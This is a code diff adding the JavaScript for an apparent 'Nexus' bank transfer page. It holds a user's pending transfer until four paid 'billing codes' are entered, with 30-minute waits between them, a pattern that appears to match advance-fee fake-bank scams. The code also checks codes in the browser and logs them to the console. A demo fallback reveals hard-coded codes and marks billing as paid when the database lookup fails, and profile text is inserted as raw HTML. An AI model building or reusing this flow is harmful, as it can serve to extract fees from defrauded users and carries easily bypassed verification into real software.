+                const { data, error } = await supabaseClient
+                    .from('user_profiles')
+                    .select('*')
+                    .eq('id', currentUser.id)
+                    .single();
+                
+                if (error) {
+                    console.error('Error loading profile:', error);
+                    return;
+                }
+                
+                userProfile = data;
+                console.log('User profile loaded:', userProfile);
+            } catch (e) {
+                console.error('Profile load error:', e);
+            }
+        }
+
+        // ============================================
+        // POPULATE BILLING INFO FROM USER PROFILE
+        // ============================================
+        function populateBillingInfoFromProfile() {
+            for (let i = 1; i <= 4; i++) {
+                const config = billingConfig[i];
+                const key = config.key;
+                
+                const amount = userProfile?.[config.amountField];
+                const serialCode = userProfile?.serial_codes?.[key];
+                const status = userProfile?.billing_status?.[key];
+                const customName = userProfile?.[`${key}_billing_name`];
+                
+                const displayName = customName || config.name;
+                const displayAmount = (amount !== undefined && amount !== null) ? amount : 0;
+                
+                const nameEl = document.getElementById(`billingName${i}`);
+                if (nameEl) {
+                    nameEl.innerHTML = `<i class="fas ${config.icon} text-indigo-400 mr-2"></i>${displayName}`;
+                }
+                
+                const amountEl = document.getElementById(`billingAmount${i}`);
+                if (amountEl) {
+                    amountEl.textContent = formatCurrency(displayAmount);
+                }
+                
+                const descEl = document.getElementById(`billingDesc${i}`);
+                if (descEl) {
+                    descEl.textContent = `Amount: ${formatCurrency(displayAmount)}. Enter your billing code below to proceed.`;
+                }
+                
+                // Update code hint - show ONLY first 4 digits
+                const hintEl = document.getElementById(`hintText${i}`);
+                if (hintEl && serialCode) {
+                    const firstFour = String(serialCode).substring(0, 4).toUpperCase();
+                    hintEl.textContent = firstFour + '-****-****-****';
+                }
+                
+                updateBillingStatusUI(i, status);
+            }
+        }
+
+        function updateBillingStatusUI(codeNumber, status) {
+            const statusEl = document.getElementById(`billingStatus${codeNumber}`);
+            if (!statusEl) return;
+            
+            const isPaid = status === 'paid';
+            
+            if (isPaid) {
+                statusEl.className = 'paid-badge';
+                statusEl.innerHTML = '<i class="fas fa-check-circle"></i> Paid';
+            } else {
+                statusEl.className = 'not-paid-badge';
+                statusEl.innerHTML = '<i class="fas fa-times-circle"></i> Not Paid';
+            }
+        }
+
+        function formatCurrency(val) {
+            if (val === undefined || val === null) return '$0.00';
+            return new Intl.NumberFormat('en-US', {
+                style: 'currency', currency: 'USD'
+            }).format(val);
+        }
+
+        // ============================================
+        // LOAD PENDING TRANSFER
+        // ============================================
+        function loadPendingTransfer() {
+            try {
+                const stored = localStorage.getItem(`nexus_pending_transfer_${currentUser?.id}`);
+                if (stored) {
+                    const parsed = JSON.parse(stored);
+                    if (!parsed.completed) {
+                        currentPendingTransfer = parsed;
+                        verifiedCodes = parsed.codesVerified || [false, false, false, false];
+                        
+                        if (parsed.timerEndTime && !parsed.timerCompleted) {
+                            const remaining = parsed.timerEndTime - Date.now();
+                            if (remaining > 0) {
+                                startTimer(remaining, parsed.timerForCode);
+                            }
+                        }
+                    }
+                }
+            } catch (e) {
+                currentPendingTransfer = null;
+            }
+        }
+
+        function savePendingTransfer() {
+            try {
+                if (currentUser && currentPendingTransfer) {
+                    currentPendingTransfer.codesVerified = verifiedCodes;
+                    localStorage.setItem(`nexus_pending_transfer_${currentUser.id}`, JSON.stringify(currentPendingTransfer));
+                }
+            } catch (e) {}
+        }
+
+        function clearPendingTransfer() {
+            try {
+                if (currentUser) {
+                    localStorage.removeItem(`nexus_pending_transfer_${currentUser.id}`);
+                }
+            } catch (e) {}
+        }
+
+        // ============================================
+        // POPULATE UI
+        // ============================================
+        function populatePendingInfo() {
+            if (!currentPendingTransfer) return;
+            
+            const t = currentPendingTransfer;
+            
+            document.getElementById('verifyAmount').textContent = formatCurrency(t.amount);
+            document.getElementById('verifyRecipient').textContent = t.recipient_name || '-';
+            document.getElementById('verifyBank').textContent = t.bank || '-';
+            document.getElementById('verifyTxnId').textContent = t.id;
+        }
+
+        function showActiveCodeSection() {
+            for (let i = 1; i <= 4; i++) {
+                const section = document.getElementById(`codeSection${i}`);
+                
+                if (verifiedCodes[i-1]) {
+                    section.classList.add('hidden');
+                } else {
+                    section.classList.add('hidden');
+                }
+            }
+            
+            let activeCode = 0;
+            for (let i = 0; i < 4; i++) {
+                if (!verifiedCodes[i]) {
+                    activeCode = i + 1;
+                    break;
+                }
+            }
+            
+            if (activeCode > 0 && !timerInterval) {
+                const section = document.getElementById(`codeSection${activeCode}`);
+                section.classList.remove('hidden');
+                section.classList.add('slide-in');
+            }
+            
+            if (verifiedCodes.every(v => v)) {
+                showCompletedState();
+            }
+        }
+
+        function showCompletedState() {
+            document.getElementById('verificationForm').classList.add('hidden');
+            document.getElementById('pendingInfoCard').classList.add('hidden');
+            document.getElementById('allVerifiedMessage').classList.remove('hidden');
+            
+            const t = currentPendingTransfer;
+            
+            document.getElementById('finalAmount').textContent = formatCurrency(t.amount);
+            document.getElementById('finalRecipient').textContent = t.recipient_name || '-';
+            document.getElementById('finalTxnId').textContent = t.id;
+        }
+
+        // ============================================
+        // TIMER FUNCTIONS
+        // ============================================
+        function startTimer(durationMs, nextCodeNum) {
+            document.getElementById('verificationForm').classList.add('hidden');
+            const timerDisplay = document.getElementById('timerDisplay');
+            timerDisplay.classList.remove('hidden');
+            timerDisplay.classList.add('slide-in');
+            
+            const totalDuration = 30 * 60 * 1000;
+            const endTime = Date.now() + durationMs;
+            
+            if (currentPendingTransfer) {
+                currentPendingTransfer.timerEndTime = endTime;
+                currentPendingTransfer.timerForCode = nextCodeNum;
+                currentPendingTransfer.timerCompleted = false;
+                savePendingTransfer();
+            }
+            
+            const config = billingConfig[nextCodeNum];
+            const name = userProfile?.[`${config.key}_billing_name`] || config.name;
+            
+            document.getElementById('timerNextCode').textContent = `${codeNames[nextCodeNum - 1]}: ${name}`;
+            document.getElementById('timerMessage').textContent = 
+                `Please wait ${Math.ceil(durationMs / 60000)} minutes before entering the next billing code.`;
+            
+            const circle = document.getElementById('timerCircle');
+            const text = document.getElementById('timerText');
+            const circumference = 2 * Math.PI * 65;
+            
+            function updateTimer() {
+                const remaining = endTime - Date.now();
+                
+                if (remaining <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    
+                    if (currentPendingTransfer) {
+                        currentPendingTransfer.timerCompleted = true;
+                        savePendingTransfer();
+                    }
+                    
+                    timerDisplay.classList.add('hidden');
+                    document.getElementById('verificationForm').classList.remove('hidden');
+                    showActiveCodeSection();
+                    
+                    showToast(`${name} is now available!`);
+                    return;
+                }
+                
+                const minutes = Math.floor(remaining / 60000);
+                const seconds = Math.floor((remaining % 60000) / 1000);
+                text.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                const progress = remaining / totalDuration;
+                const offset = circumference * (1 - progress);
+                circle.style.strokeDashoffset = offset;
+            }
+            
+            updateTimer();
+            timerInterval = setInterval(updateTimer, 1000);
+        }
+
+        // ============================================
+        // CODE INPUTS SETUP
+        // ============================================
+        function setupCodeInputs() {
+            const inputs = document.querySelectorAll('.code-segment');
+            
+            inputs.forEach((input, index, allInputs) => {
+                input.addEventListener('input', (e) => {
+                    let val = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 4);
+                    e.target.value = val;
+                    
+                    if (val.length === 4) {
+                        e.target.classList.add('filled');
+                        const next = allInputs[index + 1];
+                        if (next && next.dataset.code === input.dataset.code) {
+                            next.focus();
+                        }
+                    } else {
+                        e.target.classList.remove('filled');
+                    }
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value) {
+                        const prev = allInputs[index - 1];
+                        if (prev && prev.dataset.code === input.dataset.code) {
+                            prev.focus();
+                        }
+                    }
+                });
+                
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const paste = e.clipboardData.getData('text').toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 16);
+                    const codeNum = parseInt(input.dataset.code);
+                    const codeInputs = document.querySelectorAll(`.code-segment[data-code="${codeNum}"]`);
+                    
+                    for (let i = 0; i < 4; i++) {
+                        const start = i * 4;
+                        const segment = paste.slice(start, start + 4);
+                        if (codeInputs[i] && segment) {
+                            codeInputs[i].value = segment;
+                            if (segment.length === 4) codeInputs[i].classList.add('filled');
+                        }
+                    }
+                    
+                    const filledCount = Math.floor(paste.length / 4);
+                    const nextIndex = Math.min(filledCount, 3);
+                    if (codeInputs[nextIndex]) {
+                        codeInputs[nextIndex].focus();
+                    }
+                });
+            });
+        }
+
+        // ============================================
+        // VERIFY CODE
+        // ============================================
+        async function verifyCode(codeNumber) {
+            const codeInputs = document.querySelectorAll(`.code-segment[data-code="${codeNumber}"]`);
+            let enteredCode = '';
+            let allFilled = true;
+            
+            codeInputs.forEach(input => {
+                const val = input.value.toUpperCase();
+                enteredCode += val;
+                if (val.length !== 4) {
+                    allFilled = false;
+                    input.classList.add('error');
+                    setTimeout(() => input.classList.remove('error'), 500);
+                }
+            });
+            
+            const formattedEntered = `${enteredCode.slice(0,4)}-${enteredCode.slice(4,8)}-${enteredCode.slice(8,12)}-${enteredCode.slice(12,16)}`;
+            
+            if (!allFilled || enteredCode.length !== 16) {
+                showToast('Please enter all 16 characters', 'error');
+                return;
+            }
+            
+            const btn = document.getElementById(`verifyBtn${codeNumber}`);
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Verifying...';
+            
+            showLoader('Verifying billing code');
+            
+            try {
+                const profileMatch = await checkUserProfileCode(codeNumber, formattedEntered, enteredCode);
+                
+                if (profileMatch) {
+                    const statusUpdated = await updateBillingStatus(codeNumber);
+                    if (!statusUpdated) {
+                        console.warn('Billing status update failed, but code was correct. Continuing...');
+                    }
+                    await markVerified(codeNumber, btn);
+                } else {
+                    await checkTransferCodes(codeNumber, formattedEntered, enteredCode, btn);
+                }
+                
+            } catch (err) {
+                console.error('Verification error:', err);
+                hideLoader();
+                showToast('Verification failed. Please try again.', 'error');
+                btn.disabled = false;
+                btn.innerHTML = getVerifyButtonText(codeNumber);
+            }
+        }
+
+        // Check code against user profile serial_codes JSON field
+        async function checkUserProfileCode(codeNumber, formattedEntered, plainEntered) {
+            if (!userProfile) {
+                await loadUserProfile();
+            }
+            
+            const config = billingConfig[codeNumber];
+            const profileCode = userProfile?.serial_codes?.[config.key];
+            
+            if (!profileCode) {
+                console.log(`No serial code ${config.key} found in profile`);
+                return false;
+            }
+            
+            const profileCodeStr = String(profileCode).toUpperCase().replace(/-/g, '');
+            const normalizedEntered = plainEntered.toUpperCase().replace(/-/g, '');
+            
+            console.log(`Comparing code ${codeNumber} (${config.key}):`, profileCodeStr, 'vs', normalizedEntered);
+            
+            return profileCodeStr === normalizedEntered;
+        }
+
+        // Check against transfer_codes table (fallback)
+        async function checkTransferCodes(codeNumber, formattedEntered, plainEntered, btn) {
+            try {
+                const { data: codeData, error } = await supabaseClient
+                    .from('transfer_codes')
+                    .select('*')
+                    .eq('transaction_id', currentPendingTransfer.id)
+                    .eq('code_number', codeNumber)
+                    .single();
+                
+                if (error || !codeData) {
+                    await demoVerify(codeNumber, plainEntered, btn);
+                    return;
+                }
+                
+                const storedCode = codeData.code || '';
+                const normalizedStored = String(storedCode).toUpperCase().replace(/-/g, '');
+                const normalizedEntered = plainEntered.toUpperCase().replace(/-/g, '');
+                
+                if (normalizedStored !== normalizedEntered) {
+                    hideLoader();
+                    showToast('Incorrect code. Please try again.', 'error');
+                    resetInputs(codeNumber);
+                    btn.disabled = false;
+                    btn.innerHTML = getVerifyButtonText(codeNumber);
+                    return;
+                }
+                
+                await markVerified(codeNumber, btn);
+                
+            } catch (err) {
+                await demoVerify(codeNumber, plainEntered, btn);
+            }
+        }
+
+        // Update billing status in Supabase billing_status JSON column
+        async function updateBillingStatus(codeNumber) {
+            const maxRetries = 3;
+            let lastError = null;
+            
+            for (let attempt = 1; attempt <= maxRetries; attempt++) {
+                try {
+                    const config = billingConfig[codeNumber];
+                    const key = config.key;
+                    
+                    const { data: freshProfile, error: fetchError } = await supabaseClient
+                        .from('user_profiles')
+                        .select('billing_status')
+                        .eq('id', currentUser.id)
+                        .single();
+                    
+                    if (fetchError) {
+                        console.error(`Attempt ${attempt} - Fetch error:`, fetchError);
+                        lastError = fetchError;
+                        if (attempt < maxRetries) {
+                            await new Promise(r => setTimeout(r, 1000 * attempt));
+                            continue;
+                        }
+                        return false;
+                    }
+                    
+                    const currentStatus = freshProfile?.billing_status || {};
+                    const updatedStatus = {
+                        ...currentStatus,
+                        [key]: 'paid'
+                    };
+                    
+                    console.log(`Attempt ${attempt} - Updating billing_status to:`, updatedStatus);
+                    
+                    const { data, error } = await supabaseClient
+                        .from('user_profiles')
+                        .update({ billing_status: updatedStatus })
+                        .eq('id', currentUser.id)
+                        .select();
+                    
+                    if (error) {
+                        console.error(`Attempt ${attempt} - Update error:`, error);
+                        lastError = error;
+                        if (attempt < maxRetries) {
+                            await new Promise(r => setTimeout(r, 1000 * attempt));
+                            continue;
+                        }
+                        return false;
+                    }
+                    
+                    if (data && data[0]) {
+                        userProfile = data[0];
+                    } else {
+                        if (!userProfile.billing_status) userProfile.billing_status = {};
+                        userProfile.billing_status[key] = 'paid';
+                    }
+                    
+                    updateBillingStatusUI(codeNumber, 'paid');
+                    
+                    console.log(`Billing status ${key} updated to paid successfully`);
+                    return true;
+                    
+                } catch (e) {
+                    console.error(`Attempt ${attempt} - Exception:`, e);
+                    lastError = e;
+                    
+                    if (attempt < maxRetries) {
+                        await new Promise(r => setTimeout(r, 1000 * attempt));
+                    }
+                }
+            }
+            
+            console.error('All retries failed for billing status update:', lastError);
+            
+            if (userProfile) {
+                if (!userProfile.billing_status) userProfile.billing_status = {};
+                userProfile.billing_status[billingConfig[codeNumber].key] = 'paid';
+            }
+            updateBillingStatusUI(codeNumber, 'paid');
+            
+            return false;
+        }
+
+        // Demo mode for testing
+        async function demoVerify(codeNumber, enteredCode, btn) {
+            await new Promise(r => setTimeout(r, 800));
+            
+            const demoCodes = [
+                'JVFE-6WUB-SF3E-D3RO',
+                'ADTV-DG7V-5XBZ-N82S',
+                'MROR-GV7B-CU7T-EU7X',
+                'J906-9A2L-H5NC-BECG'
+            ];
+            
+            const normalizedExpected = demoCodes[codeNumber - 1].replace(/-/g, '');
+            const normalizedEntered = enteredCode.replace(/-/g, '');
+            
+            if (normalizedEntered !== normalizedExpected) {
+                hideLoader();
+                showToast(`Demo: Use code ${demoCodes[codeNumber - 1]}`, 'error');
+                resetInputs(codeNumber);
+                btn.disabled = false;
+                btn.innerHTML = getVerifyButtonText(codeNumber);
+                return;
+            }
+            
+            await updateBillingStatus(codeNumber);
+            await markVerified(codeNumber, btn);
+        }
+
+        function getVerifyButtonText(codeNumber) {
+            const texts = [
+                '<i class="fas fa-check mr-2"></i> Verify First Code',
+                '<i class="fas fa-check mr-2"></i> Verify Second Code',
+                '<i class="fas fa-check mr-2"></i> Verify Third Code',
+                '<i class="fas fa-check mr-2"></i> Verify Final Code & Complete'
+            ];
+            return texts[codeNumber - 1];
+        }
+
+        async function markVerified(codeNumber, btn) {
+            verifiedCodes[codeNumber - 1] = true;
+            savePendingTransfer();
+            
+            try {
+                await supabaseClient
+                    .from('transfer_codes')
+                    .update({ used: true, used_at: new Date().toISOString() })
+                    .eq('transaction_id', currentPendingTransfer.id)
+                    .eq('code_number', codeNumber);
+            } catch (e) {}
+            
+            hideLoader();
+            showToast(`Code ${codeNumber} verified and marked as paid!`);
+            
+            btn.innerHTML = `<i class="fas fa-check mr-2"></i> Verified`;
+            btn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+            
+            const allVerified = verifiedCodes.every(v => v);
+            
+            if (allVerified) {
+                setTimeout(() => {
+                    completeTransfer();
+                }, 800);
+            } else {
+                setTimeout(() => {
+                    const nextCode = codeNumber + 1;
+                    startTimer(30 * 60 * 1000, nextCode);
+                }, 1000);
+            }
+        }
+
+        function resetInputs(codeNumber) {
+            document.querySelectorAll(`.code-segment[data-code="${codeNumber}"]`).forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+        }
+
+        // ============================================
+        // COMPLETE TRANSFER
+        // ============================================
+        async function completeTransfer() {
+            showLoader('Finalizing your transfer');
+            
+            try {
+                const { data: profile } = await supabaseClient
+                    .from('user_profiles')
+                    .select('pending_balance')
+                    .eq('id', currentUser.id)
+                    .single();
+                
+                const currentPending = profile?.pending_balance || 0;
+                const newPending = Math.max(0, currentPending - currentPendingTransfer.amount);
+                
+                const { error } = await supabaseClient
+                    .from('user_profiles')
+                    .update({ pending_balance: newPending })
+                    .eq('id', currentUser.id);
+                
+                if (error) throw error;
+                
+                try {
+                    await supabaseClient
+                        .from('transactions')
+                        .update({ status: 'completed' })
+                        .eq('id', currentPendingTransfer.id);
+                } catch (e) {}
+                
+                currentPendingTransfer.completed = true;
+                savePendingTransfer();
+                
+                setTimeout(() => {
+                    hideLoader();
+                    clearPendingTransfer();
+                    showCompletedState();
+                    showToast('Transfer completed successfully!');
+                }, 1000);
+                
+            } catch (error) {
+                hideLoader();
+                showToast('Error: ' + error.message, 'error');
+            }
+        }
+
+        // ============================================
+        // TOAST
+        // ============================================
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            const toastMessage = document.getElementById('toastMessage');
+            const icon = toast.querySelector('i');
+            
+            icon.className = type === 'error' 
+                ? 'fas fa-exclamation-circle text-red-400 text-xl'
+                : 'fas fa-check-circle text-green-400 text-xl';
+            
+            toastMessage.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+    </script>
+</body>
+</html>
